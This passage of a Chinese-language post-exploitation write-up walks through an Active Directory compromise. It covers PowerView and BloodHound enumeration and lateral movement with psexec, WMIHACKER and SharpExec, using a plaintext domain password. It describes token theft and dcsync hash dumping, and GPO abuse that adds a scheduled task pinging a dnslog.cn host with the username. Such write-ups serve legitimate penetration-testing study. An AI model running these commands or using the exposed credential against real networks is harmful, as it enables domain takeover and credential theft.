> Alias name administrators  
>  Comment Administrators have complete and unrestricted access to the
> computer/domain
>
> Members
>
> * * *
>
> Administrator  
>  king  
>  POXPL\CASUALTY USERS  
>  POXPL\casualty1  
>  POXPL\casualty2  
>  POXPL\casualty3  
>  POXPL\Domain Admins  
>  POXPL\mahendran  
>  POXPL\mahendranm  
>  The command completed successfully.
Domain Admins组中的用户默认为域内机器的本地管理员用户。在实际应用中，为了方便管理，会有域用户被设置为域机器的本地管理员用户。
**5.查询域管理员组**
`net group "Domain admins" /domain`
> Group name Domain Admins  
>  Comment Designated administrators of the domain
>
> Members
>
> * * *
>
> Administrator Aravind mahendran  
>  Thiag_67  
>  The command completed successfully.
可以看到这里存在4个域管账户
**6.查询管理员用户组**
`net group "Enterprise Admins" /domain`
> Members
>
> * * *
>
> Administrator itadmin italert  
>  mahendran mahendranm Rkumar  
>  ssk
可以看到存在权限非常高的企业管理员组中有7个用户属于该组。
### 0x3.5 定位域管理员
定位域内管理员常规渠道: 1.日志 2.会话
日志是指本地机器的管理员日志，可以使用脚本活Wevtuil工具导出并查看
会话是指域内每台机器的登录会话，可以使用netsess.exe或者PowerView工具查询(可以匿名查询，不需要权限)。
这里方法有很多,这里我只介绍我最常用的一种: PowerView
这里需要介绍下它的优缺点。
> `Invoke-StealUserHunter`:
> 只需要进行一次查询，就可以获取域里面的所有用户。使用方法为，从user.HomeDirectories中提取所有用户，并对每台机器能Get-> NetSessions获取。因为不需要使用Invoke-> UserHunter对每台机器进行操作，所以这个方法隐蔽性相对较高(但涉及的机器不一定全面)。PowerView默认使用Invoke-> StealthUserHunter,如果找不到需要的信息，就使用Invoke-UserHunter。
>
> `Invoke-UserHunter`:找到域内特定的用户群，接收用户名、用户列表和域组查询，接收一个主机列表或查询可用域名。它可以使用Get-> NetSessions 和 Get-NetLoggedon(调用NetSessionEnum和NetWkstaUserEnum
> API)扫描每台服务器并对扫描结果进行比较,从而找出目标用户集，在使用时不需要管理员权限*
CS4.0下导入powerview
`powershell-import /Volumes/windowSSD/后渗透/PowerSploit/Recon/PowerView.ps1`
`powershell Invoke-UserHunter`
> output:
>
> UserDomain :  
>  UserName : Administrator  
>  ComputerName : POxSxRVER.poxpl.com  
>  SessionFrom : 192.168.1.112  
>  SessionFromName : acc04.poxpl.com  
>  LocalAdmin :
>
> UserDomain :  
>  UserName : mahendran  
>  ComputerName : POHSxRVER.poxpl.com  
>  SessionFrom : 192.168.1.82  
>  SessionFromName : poxpl074.poxpl.com  
>  LocalAdmin :
>
> ...
>
> 可以看到82和112有机器用域管账户登陆了域控。
同理可以利用针对特定目标简单获取
`Get-NetSession` 获取会话
`Get-NetLoggedon` 获取已经登陆过的用户
附上一个常用用法:
    Get-NetDomain: 获取当前用户所在域的名称
    Get-NetUser: 获取所有用户的详细信息
    Get-NetDomainController: 获取所有域控制器的信息
    Get-NetComputer: 获取域内所有机器的详细信息
    Get-NetOU: 获取域中的OU信息
    Get-NetGroup: 获取所有域内组和组成员信息
    Get-NetFileServer: 根据SPN获取当前域使用的文件服务器信息
    Get-NetShare: 获取当前域内所有网络共享信息
    Get-NetSession: 获取指定服务器的会话
    Get-NetRDPSession: 获取指定服务器的远程连接
    Get-NetProcess: 获取远程主机的进程
    Get-UserEvent: 获取指定用户的日志
    Get-ADObiect: 获取活动目录的对象
    Get-NetGPO: 获取域内所有的组策略对象
    Get-DomainPolicy: 获取域默认策略或域控制器策略
    Invoke-UserHunter: 获取域用户登录的计算机信息及该用户是否有本地管理员权限
    Invoke-ProcessHunter: 通过查询域内所有的机器进程找到特定用户
    Invoke-UserEvenHunter: 根据用户日志查询某域用户登录过哪些域机器。
[powerview tricks](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview)
### 0x3.6 查找域管理进程
假设我们存在一个场景:
>
> 我们已经获得了一个域普通用户的权限，然后我们通过提权或者其他方式获得了本地的管理员权限，然后分析当前服务器的用户登录列表及会话信息，知道了哪些用户登录了这台服务器。但是我们发现可以获取权限的登录用户都不是域管理员账户，同时没有域管理员中的用户登陆过这台机器。我们可以使用获得的其他用户并寻找该账户在内网的哪台机器上具有管理权限，再枚举这台机器上的登录用户，然后继续渗透测试，直至找到一个可以获取域管理员权限的有效路径为止。
**1.本机检查**
这个比较简单,我们直接执行`tasklist /svc`
比对`net group "Domain Admins" /domain` 显然当前进程用户不在里面。
如果能找到那么我们就可以直接拿下域控了,事情往往没有那么简单。
**2\. 查询域控制器中域用户会话**
感觉书里面写的怪怪的，很多东西重复了很多次，也有可能是我不理解，下面说一下我自己的操作吧。
先获取到域控制器列表
`net group "Domain Controllers" /domain`
然后在获取域管理员列表
`net group "Domain Admins" /domain`
然后收集所有域控制会话列表然后与域管理员做一个交叉就可以确定域管理员存在的机器了。(感觉是上一节的内容)
**3.枚举用户是否为本地管理员**
单线程枚举
`Get-DomainComputer | Test-AdminAccess`
多线程枚举
`Find-LocalAdminAccess -Verbose`
通过查看域组策略的方式来确定
`Get-DomainGPOComputerLocalGroupMapping`
`Get-DomainGPOLocalGroup`
通过查询域内所有机器本地的管理员来对比:
`Invoke-EnumerateLocalAdmin`
如果是的话,直接横向过去,然后继续搜索凭据,然后查看有没有管理员，没有就继续获取当前机器的用户账号，继续这种操作。
然后直接横向过去吧。`jump psexec POHPL073 http`,杀软没过，那就执行命令。
    cscript //nologo WMIHACKER_0.6.vbs /cmd POHPL073 POHPL\ior1 "ior$123" "whoami" 1
这里不知道为啥登录成功了。却返回这个错误信息：
`C:\Windows\temp\WMIHACKER_0.6.vbs(60, 3) SWbemLocator: Access is denied.`
后面采取了sharpexec来用
`execute-assembly /Volumes/windowSSD/后渗透/SharpExec/release/SharpExec.exe
-m=wmi -i=192.168.1.194 -d=pohpl -u=ior1 -p=ior$123
-e=C:\Windows\System32\cmd.exe -c="/c ping 7XXx.dnslog.cn"`
后面就是重复操作了,就像深度搜索一样寻找域管的凭据的路径。。。最终在一台机器上找到了域管的进程
然后steal_token伪造域管令牌,然后直接dcsync dump下全部hash。
其实我也在其他机器上抓到了域管的hash然后解密出了域管的明文密码,这个是属于比较常见的拿下域控的方式。
### 0x3.7 BloodHound自动化收集域信息
> 这个工具比较强大,也比较快，想找个机会分析它是怎么实现的。
>
> 下面简单看看我概括的介绍。
>
>
> BloodHound是一款免费的工具。一方面，BloodHound通过图与线的形式，将域内的用户、计算机、组、会话、ACL以及域内所有的相关用户、组、计算机、登录信息、访问控制策略、之间的关系，直观地展现在Red
> Team成员面前，为他们更快捷地分析域内情况、更快速地在域内提升权限提供条件。省略蓝队内容~~.BloodHound使用图形理论，在活动目录环境中自动理清大部分人员之间的关系和细节，可以快速、深入地了解活动目录中用户之间的关系，获取哪些用户具有管理员权限、哪些用户对所有的计算机都具有管理员权限、哪些用户是有效的用户组成员等信息。
>
> BloodHound
> 可以在域内导出相关信息，然后导入本地的neo4j数据库，并进行展示和分析。neo4j是一款NoSQL图形数据库，它将结构化数据存储在网络内而不是表中。BloodHoud正是利用Neo4j的这种特性，通过合理的分析，直观地以节点空间的形式表达相关数据的。Neo4j拥有自己的查询语言Cypher
> Query Language，因为其是非关系数据库，所以，要想在其中进行查询，需要使用其特有的语法。
>
> 不过问题不大，默认有12种比较贴心的功能。
**1.使用bloodHound收集信息**
    1.使用本机收集
    execute-assembly /Volumes/windowSSD/后渗透/BloodHound/Ingestors/SharpHound.exe  -all
    2.使用指定账号查询
    execute-assembly /Volumes/windowSSD/后渗透/BloodHound/Ingestors/SharpHound.exe  --domaincontroller 192.168.1.37 --ldapusername 0 --ldappassword 0 --domain poxpl.xxx
**2.Neo4j加载压缩包**
> Enumeration finished in 00:00:56.7099642  
>  Compressing data to .\2020121xx74110_BloodHound.zip
>
> `download BloodHound.zip` 即可。
里面有个Queries功能有个`Find Shortest Paths to Domain Admins`,其实有一定的参考价值。可以试试。
这里可以看到Domain User组对`COSEC`GPO有GnericWrite权限,然后该GPO能够作用于域管账户。
也就是说我们只要拥有一个域用户的就可以对Administrator这个域用户对象进行自定义组策略,这倒是一个有意思的拿下域管的思路。
`Get-DomainGPO -ComputerIdentity pohpl -Properties Name, DisplayName` 先列出GPO目录
给GPO添加计划任务执行命令。
    Add-UserTask -GPOIdentity 'COSEC' -TaskName 'eviltask' -Command 'cmd.exe' -CommandArguments "/c ping %username%.5x1f.dnslog.cn" -Author Administrator
不过这个计划任务必须要要Administrator登录才行,因为作用是用户而不是机器,纯粹拿来试试手，学习bd的最短路径，确实有一定的合理性。
只要登录就轻轻松松拿下域管权限,问题不大。
最后手动清除计划任务即可。
关于GPO的滥用，后面有机会的话，我会在学习约束资源委派的时候跟你们分享。
## 0x4 域环境横向目标
### 0x4.1 搭建加密隧道
这个主要是关于书中的第三章-隐藏通信隧道技术。
>
> 一般的网络通信，主要是两台机器之间通过建立TCP连接，然后进行正常的数据通信。在知道IP地址的情况下,可以之间发送报文，不知道ip地址则需要将域名解析成ip地址。在实际的网络中，通常会通过各种边界设备，软/硬件防火墙甚至入侵检测系统来检查对外连接的情况，如果发现异常，就会对通信进行阻断。
>
> 什么是隧道?
> 这里的隧道就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数包类型或端口进行封装，然后穿过防火墙，与对方通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到对应的服务器上。
>
> 常用隧道列举如下:
>
>   * 网络层:IPV6隧道,ICMP隧道,GRE隧道
>   * 传输层:TCP隧道, UDP隧道,常规端口转发
>   * 应用层: SSH隧道,HTTP隧道,HTTPS隧道,DNS隧道
>
下面会展示部分利用各种隧道的操作,这里就不便进行专题展开。
**1.判断内网连通性**